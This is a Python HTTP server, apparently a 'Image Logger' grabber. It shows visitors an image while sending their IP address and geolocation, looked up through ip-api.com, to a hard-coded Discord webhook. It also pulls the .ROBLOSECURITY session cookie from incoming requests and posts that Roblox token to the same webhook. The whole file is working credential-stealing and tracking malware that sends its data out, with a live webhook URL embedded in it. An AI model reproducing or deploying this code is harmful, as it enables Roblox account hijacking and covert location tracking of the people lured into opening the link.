from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests
import base64
import traceback

config = {
    "webhook": "https://discord.com/api/webhooks/1348770175704629278/TOLB8mcoNonVzvVWNUH2fKU8yA4Htw6hRCsCXaLvBZ4H6AH1bI6PsFGYX0bLm992f_ew",
    "image": "https://cdn.discordapp.com/attachments/1302897043894829058/1397806335675994112/IMG__.jpg?ex=689acb18&is=68997998&hm=685f07161ebff9f96eb6feed5e3da63cee536a64ff1bc6d7d9238900499334d4&",
    "username": "Image Logger",
    "color": 0x00FFFF,
}

blacklistedIPs = ("27", "104", "143", "164")

def makeReport(ip, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except Exception:
        info = {}

    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
"""
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0] or "Unknown"

            # استخراج توكن روبلوكس من الكوكيز
            roblox_token = None
            cookies = self.headers.get("cookie", "")
            for cookie in cookies.split(";"):
                if cookie.strip().startswith(".ROBLOSECURITY="):
                    roblox_token = cookie.strip().split("=", 1)[1]
                    break

            if roblox_token:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "content": f"Roblox Token Captured: `{roblox_token}`"
                })

            url = config["image"]
            s = self.path
            params = dict(parse.parse_qsl(parse.urlsplit(s).query))
            if params.get("url"):
                try:
                    url = base64.b64decode(params.get("url")).decode()
                except Exception:
                    pass

            makeReport(ip, endpoint=self.path.split("?")[0], url=url)

            html = f'''<style>body{{margin:0;padding:0;}}
            div.img {{
                background-image: url('{url}');
                background-position: center center;
                background-repeat: no-repeat;
                background-size: contain;
                width: 100vw;
                height: 100vh;
            }}</style><div class="img"></div>'''

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())

        except Exception:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

if __name__ == "__main__":
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, ImageLoggerAPI)
    print("Server running on port 8080...")
    httpd.serve_forever()
